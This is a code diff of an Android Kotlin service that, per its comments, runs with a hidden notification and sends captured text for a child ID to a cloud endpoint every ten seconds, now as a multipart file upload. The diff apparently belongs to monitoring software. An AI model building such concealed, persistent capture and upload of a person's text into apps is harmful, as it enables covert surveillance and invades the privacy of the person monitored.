@@ -23,6 +23,7 @@ import retrofit2.converter.moshi.MoshiConverterFactory
 import androidx.core.content.edit
 import okhttp3.OkHttpClient
 import androidx.localbroadcastmanager.content.LocalBroadcastManager
+import okhttp3.MultipartBody
 
 // starts CloudDispatchService in the background with a hidden notification
 class ForegroundDispatchService : Service() {
@@ -85,7 +86,7 @@ class ForegroundDispatchService : Service() {
                 catch (e : Exception) {
                     Log.d("MyLog", "${e.message}")
                 }
-                delay(60000) // 10 seconds delay
+                delay(10000) // 10 seconds delay
             }
         }
         return START_STICKY // app will try to restart service if it is stopped
@@ -129,12 +130,13 @@ class ForegroundDispatchService : Service() {
     }
 
     private suspend fun postText(capturedText : String) {
-        Log.d("ChildID", "$childID")
         //blockTheApp()
         // example of text data
-        val request: RequestBody = capturedText.toRequestBody("text/plain".toMediaType())
+        val bytes = capturedText.toByteArray(Charsets.UTF_8)
+        val request : RequestBody = bytes.toRequestBody("text/plain".toMediaType())
+        val textPart = MultipartBody.Part.createFormData("file", "data.txt", request)
         // response from the Cloud
-        val response = cloudDispatchService.sendData(childID!!, request)
+        val response = cloudDispatchService.sendData(childID!!, textPart)
         // checks success of response
         if (response.isSuccessful) {
             Log.d("MyLog", "Success(text)")
